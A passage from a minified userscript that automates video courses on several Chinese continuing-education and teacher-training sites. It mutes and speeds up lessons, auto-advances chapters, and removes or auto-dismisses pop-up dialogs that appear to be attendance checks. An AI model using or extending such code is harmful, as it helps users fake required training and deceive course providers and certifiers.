            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        async playNext() {
            MyTool.openInTab("http://www.zhuzhouteacher.com/teacheredu/main/mycenter/course-learning"), setTimeout(() => {
                window.close()
            }, 5e3)
        }
    }

    zhuzhouteacher.ctxid = 60;

    class yinghuaxuetang extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".detmain .list .item a "), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("on")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e, t, l = await this.getVideoDom();
            1 == l && (e = document.querySelector(".promptchmqylqsxtfb"), t = document.querySelector(".mutechtkfjgkqelf"), e && e.click(), t && t.click(), ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == l && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 4e3))
        }
    }

    yinghuaxuetang.ctxid = 60;

    class gzgbjy extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".tab-content-desc"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("desc-item-sel")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
            }, 1e4)
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 4e3))
        }
    }

    gzgbjy.ctxid = 60;

    class guizhoujianshezyjs extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".catalog div>a"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("cur")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e, t = await this.getVideoDom();
            1 == t && (ElementObj.$video.volume = 0, (e = document.querySelector(".vplay")).classList.contains("vmPause") || e.click(), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == t && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
            }, 1e4)
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 4e3))
        }
    }

    guizhoujianshezyjs.ctxid = 60;

    class jixujiaoyuzaixian extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".video-list-item-span"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (-1 == ElementObj.$allTask[e].innerText.indexOf("\u5df2\u5b66\u5b8c")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                document.querySelector(".el-message-box__btns .el-button--primary")?.click()
            }, 1e4)
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 4e3))
        }
    }

    jixujiaoyuzaixian.ctxid = 60;

    class moocxinyingzao extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll("#pane-category .resource-list-item"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) {
                var t = ElementObj.$allTask[e].querySelector(".resource-action span").innerText;
                if (!["\u5df2\u5b8c\u6210", "\u6b63\u5728\u5b66"].includes(t)) {
                    this.currentIndex = e;
                    break
                }
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (ElementObj.$allTask[this.currentIndex].click(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, document.querySelector("iframe") ? (clearInterval(l), e(2)) : (ElementObj.$video = document.querySelectorAll("video")[0], ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2)))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".ant-modal-root");
                e && e.parentNode?.removeChild(e)
            }, 1e4)
        }

        async playNext() {
            this.getCurrentIndex()
        }
    }

    moocxinyingzao.ctxid = 60;

    class dongbeishifandaxue extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".course-list-con .ovd"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("cur")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".ant-modal-root");
                e && e.parentNode?.removeChild(e)
            }, 1e4)
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].querySelector("a")?.click(), setTimeout(() => {
                this._o1()
            }, 6e3))
        }
    }

    dongbeishifandaxue.ctxid = 60;

    class qzjystudy extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                try {
                    var e;
                    ElementObj.$allTask = document.querySelectorAll(".videoList .item"), ElementObj.$allTask.length ? (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), this.getCurrentIndex()) : (e = document.querySelector("iframe")) ? (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), location.href = e.src) : (ElementObj.$allTask = document.querySelectorAll(".videoList .item"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(t), this.getCurrentIndex()))
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var t = 0; t <= ElementObj.$allTask.length - 1; t++) {
                var l = ElementObj.$allTask[t];
                let e;
                if (e = "/v2/detail-public" === location.pathname ? l.querySelector(".ml50").innerText : ["jnrcpx.qzjystudy.com", "jnzjstu.qzjystudy.com"].includes(location.host) ? (e = (l.querySelector(".text")?.nextSibling).innerText).match(/\((.+)\)/)[1] : l.querySelectorAll("span")[1].innerText, parseInt(e) < 99) {
                    this.currentIndex = t;
                    break
                }
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (ElementObj.$allTask[this.currentIndex].click(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".ant-modal-root"), t = document.querySelector(".pv-ask-modal-wrap");
                (e || t) && (e = e || t).parentNode?.removeChild(e)
            }, 1e4)
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex]?.click(), setTimeout(() => {
                this._o1()
            }, 6e3))
        }
    }

    qzjystudy.ctxid = 60;

    class gaodengxueli extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".course-list-txt dd i"), ElementObj.$allTask.length && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("fa-youtube-play")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (ElementObj.$allTask[this.currentIndex].parentElement.click(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".ant-modal-root");
                e && e.parentNode?.removeChild(e)
            }, 1e4)
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].parentElement?.click(), setTimeout(() => {
                this._o1()
            }, 6e3))
        }
    }

    gaodengxueli.ctxid = 60;

    class hunannmdxs extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    document.querySelector(".pull-right>a") && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(e), this._o1())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("fa-youtube-play")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (ElementObj.$allTask[this.currentIndex].parentElement.click(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$sigleBtn = document.querySelector(".forumaddnew form button.btn.btn-secondary"), ElementObj.$sigleBtn ? (clearInterval(l), e(3)) : (ElementObj.$video = document.querySelectorAll("video")[0], ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2)))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 3 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext()), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".ant-modal-root");
                e && e.parentNode?.removeChild(e)
            }, 1e4)
        }

        async playNext() {
            var e = document.querySelector(".pull-right>a");
            e ? (await sleep(2500), e?.click(), setTimeout(() => {
                this._o1()
            }, 5e3)) : alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c")
        }
    }

    hunannmdxs.ctxid = 60;

    class bainianshuren extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this.swiperIndex = 0, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$parentNodes = document.querySelectorAll(".project-course li"), ElementObj.$parentNodes.length ? (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", this.getParentIndex()) : (ElementObj.$allTask = document.querySelectorAll(".el-tree-node"), ElementObj.$allTask.length && (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", this.getCurrentIndex()))
                } catch (e) {
                }
            }, 1e3)
        }

        async getParentIndex() {
            for (var e = 0; e <= ElementObj.$parentNodes.length - 1; e++) {
                var t = ElementObj.$parentNodes[e], l = t.querySelector(".project-courseTitle span").innerText;
                if ("\u5b66\u4e60\u4e2d" == l || "\u672a\u5b66\u4e60" == l) {
                    MyTool.setValue("homeUrl", location.href), t.querySelector("span.project-courseButton").click();
                    break
                }
            }
        }

        async getCurrentIndex() {
            await sleep(2500);
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if ("\u5df2\u5b66\u4e60" != ElementObj.$allTask[e].querySelector("i").title.trim()) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? (location.href = "https://v3.dconline.net.cn/student.html#/project/index?project_id=13844", setTimeout(() => {
                location.reload()
            }, 3e3)) : (ElementObj.$allTask[e].querySelector(".nav_menu").click(), await sleep(2500), 1 == await this.getSwiperItem() ? this.getSwiperIndex() : this._o1(), showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3))
        }

        async getSwiperIndex() {
            for (var e = 0; e <= ElementObj.$swiperItem.length - 1; e++) if ("\u5df2\u5b66\u4e60" != ElementObj.$swiperItem[e].querySelector(".video-status").innerText.trim()) {
                this.swiperIndex = e;
                break
            }
            ElementObj.$swiperItem[this.swiperIndex].querySelector("i.el-icon-video-play").click(), await sleep(2500), document.querySelector(".el-message-box__btns .el-button--primary")?.click(), setTimeout(() => {
                this._o1()
            }, 4e3)
        }

        async getSwiperItem() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$swiperItem = document.querySelectorAll(".public-articleSlideList"), ElementObj.$swiperItem.length ? (clearInterval(l), e(1)) : 3 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.timer), clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e, t = await this.getVideoDom();
            1 == t && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = 1
            }, 3e3), e = document.querySelector("#video"), this.changeHtml(e), this.listenPlayTime(), this.listenRebort(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            })), 2 == t && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        async playNext() {
            var e;
            this.currentIndex >= ElementObj.$allTask.length - 1 ? (e = MyTool.getValue("homeUrl"), location.href = e, setTimeout(() => {
                location.reload()
            }, 3e3)) : (setTimeout(() => {
                location.reload()
            }, 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".el-dialog__body");
                e && (e.style.display = "none")
